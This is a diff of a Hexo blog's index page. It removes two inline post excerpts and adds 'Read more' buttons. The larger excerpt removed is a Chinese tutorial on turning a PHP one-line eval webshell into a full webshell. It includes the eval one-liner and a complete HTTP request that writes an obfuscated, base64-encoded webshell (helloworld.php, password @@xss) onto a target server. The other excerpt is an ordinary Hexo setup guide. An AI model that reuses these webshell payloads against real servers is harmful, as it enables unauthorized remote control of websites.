@@ -309,18 +309,16 @@
 
       
         
-          
-            <a id="more"></a>
-<h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>上传大马主要是进行提权等操作，笔者遇到写入一句话后不能使用中国菜刀等工具连接，一句话仅能够执行命令如phpinfo(),因此我就想出另一个思路,通过执行命令来写入一个webshell，进过自己的试验，能够成功的写入webshell。但是有一个问题就是，有的有墙啊狗啊什么的时候，只有一次写入的机会，ip就会被ko了。更换个ip以后能够成功的访问到shell.如下是具体的思路分享。</p>
+          <h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>上传大马主要是进行提权等操作，笔者遇到写入一句话后不能使用中国菜刀等工具连接，一句话仅能够执行命令如phpinfo(),因此我就想出另一个思路,通过执行命令来写入一个webshell，进过自己的试验，能够成功的写入webshell。但是有一个问题就是，有的有墙啊狗啊什么的时候，只有一次写入的机会，ip就会被ko了。更换个ip以后能够成功的访问到shell.如下是具体的思路分享。</p>
 <h3 id="普通PHP一句话木马"><a href="#普通PHP一句话木马" class="headerlink" title="普通PHP一句话木马"></a>普通PHP一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;xss&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>这个一句话木马就是一个简单的命令执行，如何利用命令执行来上传一个webshell<br>如下是使用命令执行通过BurpSuite写入网站一个webshell;</p>
-<h3 id="burpsuite写webshell"><a href="#burpsuite写webshell" class="headerlink" title="burpsuite写webshell"></a>burpsuite写webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /mm.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.103:8889</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2313</span><br><span class="line"></span><br><span class="line">xss=@eval(base64_decode($_POST[action]));</span><br><span class="line">&amp;action=JG15ZmlsZT1mb3BlbigiLi9oZWxsb3dvcmxkLnBocCIsInciKTtmd3JpdGUoJG15ZmlsZSxiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZDEnXSkpO2VjaG8gIjEiOw==</span><br><span class="line">&amp;d1=PD9waHAKJHBhc3N3b3JkPSdAQHhzcyc7CiRodG1sPSckcGFzc3dvcmQnLic9Jy4iJyIuJHBhc3N3b3JkLiInOyIuJ0BlI2h0bWwnLicnLid2Jy4iIi4nJy4nJy4iIi4nJy4nJy4nJy4nYScuJycuJ2woJy4nZycuJycuIiIuJycuJycuJ3onLidpJy4nJy4nJy4nbicuJ2YnLidsJy4nJy4nJy4iIi4nYScuJ3QnLidlKGInLidhcycuJycuJycuJycuIiIuJycuJ2UnLic2Jy4nJy4iIi4nJy4iIi4iIi4iIi4nJy4nNF8nLidkJy4nZScuJ2MnLicnLicnLicnLiIiLicnLiIiLidvJy4nZCcuJ2UnLicoJy4iJ2xWWmhiNXRJRVAwZUtmOWhnNklDRXVmZ1hCeTFzU0kxVFRISktjWTVqSnNtYllUd3NwaXRNVXQzU1dpVCtyL2ZMTFpqak4zVXh4ZkU3c3liTjI5blp0bmRJWnd6N25PU01aN1RkS1NaZW50M1J4QWhLRXQ5a1FjODErUUtqWkMyUjRVZ3ViYnY5NjErLzdMbmZGR3lPQXN5cXR6ck9ucmUzVUh3N0dOMGlsUzFQZjk2RUlRSEk1TG1jclhMbm1pU0JBZEhEUk5wbUUyeUlLZkRoTFJSdDM5cG9lT0cyVVkzTkExWklaRGpvVmJqVUYvaThBUVFob0VneDBkK1NEQUxpYmI2cGR3TzRuN1hkcXpoMzNmZHJ2blA0NjBaMnVGaHgzTStmNkREVDltaGQ1RzVvZG42Nk55MDRrL044YnZ6MGVtcG91dVZDQTRwNmpHVXE2Y1AxME03aVlPbWV4bDhkdjd0MlhIUnRUdGpiSTlhMk80VWdUZmcrTnRkY25zNExtNjl1QlhjWlBuZFUvSkliS2ZvM1RnOG5NU1RxMEpHbWdlU1FrWVBLYzZsdnVRSEZiblExRWd3UEdZWlNkV2xraVdyaEtaalNEd0x1Q0ErVU5Ra3p3VlVhZkg5Z2ZDZllGS2FmbEZCMDFpOXJ4ckVURWoxUmM1emxyQ0NjRzF1S2pmVSt4V3dLQVBMRnpKYTZXdWd0NmFCOXFGT1VqWjdBNVNCbW1iVlUyWUYzaXZrUzBUMklJTXJ0dVdoZytjWjJTbTY4THpyZzJiRC9NcS9wa3A3ZzBjRFhDNGc5Z2w2TGpsTVg3VWNRSkg5ZFNhcjdBVDkveHA3RmZxY3BTa3B6K29FblNkTUVHbTl5U01xT00ySjFNQW92ZlU2SWsxakVvU0VneHJOK2g1bWFRN3NoVlNxRGx6RU5DSFFleEZoVVNueG1zYUxRaUh5N0VZRTZxbGtjV1MrTzY2emVEbXFKWnRUWkc1RVhDWFdtQlVZMllBMy9WT0lOMitRTnVjSCtZRjA2TmN2VkZtUWF1cS81MUFSenZ4eitOcG5oT1dobGJxdGlTNmJacEZnWlhPT01GMjI2eDRVZk1aQVZtd3M1b1F1czFwcll3eWJQazFwcnI2eVQzNFFYRzl6SEFPWkYyK3R5clZjaGJITE1waThPRGJRK2NDOTZsMTdQcnhtZExheTlpNjdWbS9nUWQrMnRySjNMVy9nT3A1NzV2UTdsbXNnengxWTI5SHFXKzZaYlRtZVVabitLME1HTDNLVlNram5OZHo1b1MxM3RqZ01FTTZINHRmVUlJRXBKMmVsSDIyYXFEbVpaTExSM2tmUVYydmp0SXdBRnZsUGJXYXA2eHZLNWoyZFpJbThIbFRWbUNPdWdWUm9LaUZKUGxKK2xvWWRpS2xzaHBSMFpBTCtvaVJYdUZVRTJKVC9IalJTRkNTQzFNcHFOdmZsN1o0RWVKWXQyQU1qQlp6eHlxbXNYK3JnUEhxaWFaUUVlZjJ5QmQ4S3MrbnM5MkNMdndQeUdDUWJMUUJzK2g4PScpKSk7IjskY3NzPWJhc2U2NF9kZWNvZGUoIlEzSmxZWFJsWDBaMWJtTjBhVzl1Iik7JHN0eWxlPSRjc3MoJycscHJlZ19yZXBsYWNlKCIvI2h0bWwvIiwiIiwkaHRtbCkpOyRzdHlsZSgpOy8qKSk7Lic8bGlua3JlbD0ic3R5bGVzaGVldCJocmVmPSIkI2NzcyIvPic7Ki8K</span><br></pre></td></tr></table></figure>
-<p>请求头中post三个参数, xss是要执行的PHP代码,action是写入webshell的操作,经过解码之后:<img src="/images/eval_1.png" alt>注意：为防止特殊字符转码问题,统一使用base64转码再解码. d1(一)参数是要写入的webshell,也是通过base64编码.(webshell可以自己填入，这里的只是个思路。)</p>
-<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><p>写入成功后会在response中返回 1 ，代表写入成功。webshell路径和一句话木马的路径一样，文件名为：helloworld.php 密码：@@xss<br><img src="/images/eval_2.png" alt></p>
-<h3 id="Webshell写入脚本"><a href="#Webshell写入脚本" class="headerlink" title="Webshell写入脚本"></a>Webshell写入脚本</h3><p>下载地址：<a href="https://github.com/hatmagic/webshellWrite/" target="_blank" rel="noopener">Github</a></p>
-<p>脚本的运行结果如图所示：<br><img src="/images/eval_3.png" alt></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/02/28/命令执行getshell/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -386,7 +384,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/02/27/test/" itemprop="url">test</a></h1>
+                <a class="post-title-link" href="/2019/02/27/test/" itemprop="url">hexo安装教程</a></h1>
         
 
         <div class="post-meta">
@@ -437,21 +435,15 @@
 
       
         
-          
-            <a id="more"></a>
-<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/creationix/nvm/v0.16.1/install.sh | bash</span><br><span class="line">nvm ls-remote</span><br><span class="line">nvm install 0.12</span><br></pre></td></tr></table></figure>
+          <h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/creationix/nvm/v0.16.1/install.sh | bash</span><br><span class="line">nvm ls-remote</span><br><span class="line">nvm install 0.12</span><br></pre></td></tr></table></figure>
 <h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init blog</span><br><span class="line"><span class="built_in">cd</span> blog/</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<h3 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: http://github.com/suexcxine/suexcxine.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-<h3 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"Hello Hexo"</span> 或 hexo n <span class="string">"Hello Hexo"</span> 生成一个markdown文件骨架用于填写内容</span><br></pre></td></tr></table></figure>
-<h3 id="markdown文件头部-支持多标签"><a href="#markdown文件头部-支持多标签" class="headerlink" title="markdown文件头部, 支持多标签"></a>markdown文件头部, 支持多标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: Ubuntu下安装phpmyadmin</span><br><span class="line">date: 2015-07-17</span><br><span class="line">tags: [ubuntu, phpmyadmin]</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-<h3 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo generate 或 hexo g 写完博客后, 生成静态内容</span><br><span class="line">hexo server 或 hexo s 启动本地服务器可以先看一下效果</span><br><span class="line">hexo deploy 或 hexo d 发布到外网</span><br></pre></td></tr></table></figure>
-<h3 id="怎样将域名绑定到github-pages博客上"><a href="#怎样将域名绑定到github-pages博客上" class="headerlink" title="怎样将域名绑定到github pages博客上"></a>怎样将域名绑定到github pages博客上</h3><p>在source目录下添加一个CNAME文件,没有后缀名,里面内容为你的域名(如test.com),不需要添加http/www等前缀<br>到域名解析服务商如DNSPod里添加相应的DNS CNAME记录</p>
-<h3 id="每次重启电脑都需要nvm-use启动"><a href="#每次重启电脑都需要nvm-use启动" class="headerlink" title="每次重启电脑都需要nvm use启动"></a>每次重启电脑都需要nvm use启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm use 0.12</span><br></pre></td></tr></table></figure>
-<h3 id="解决半角引号变成全角引号-–变成全角的问题"><a href="#解决半角引号变成全角引号-–变成全角的问题" class="headerlink" title="解决半角引号变成全角引号,–变成全角的问题"></a>解决半角引号变成全角引号,–变成全角的问题</h3><p>hexo使用的markdown parser是marked,<br>在_config.yml中加入一行(空格不能省略)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">marked: &#123;smartypants: false&#125;</span><br></pre></td></tr></table></figure></p>
-<p>即可</p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="noopener">http://ibruce.info/2013/11/22/hexo-your-blog/</a><br><a href="http://blog.maxwi.com/2014/02/22/first-post/" target="_blank" rel="noopener">http://blog.maxwi.com/2014/02/22/first-post/</a><br><a href="https://zespia.tw/blog/2012/10/11/hexo-debut/" target="_blank" rel="noopener">https://zespia.tw/blog/2012/10/11/hexo-debut/</a><br><a href="https://hexo.io/" target="_blank" rel="noopener">https://hexo.io/</a><br><a href="https://github.com/creationix/nvm/" target="_blank" rel="noopener">https://github.com/creationix/nvm/</a><br><a href="https://github.com/hexojs/hexo" target="_blank" rel="noopener">https://github.com/hexojs/hexo</a><br><a href="https://github.com/hexojs/hexo/wiki" target="_blank" rel="noopener">https://github.com/hexojs/hexo/wiki</a><br><a href="https://github.com/hexojs/hexo/issues/1492" target="_blank" rel="noopener">https://github.com/hexojs/hexo/issues/1492</a><br><a href="https://github.com/chjj/marked#smartypants" target="_blank" rel="noopener">https://github.com/chjj/marked#smartypants</a></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/02/27/test/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
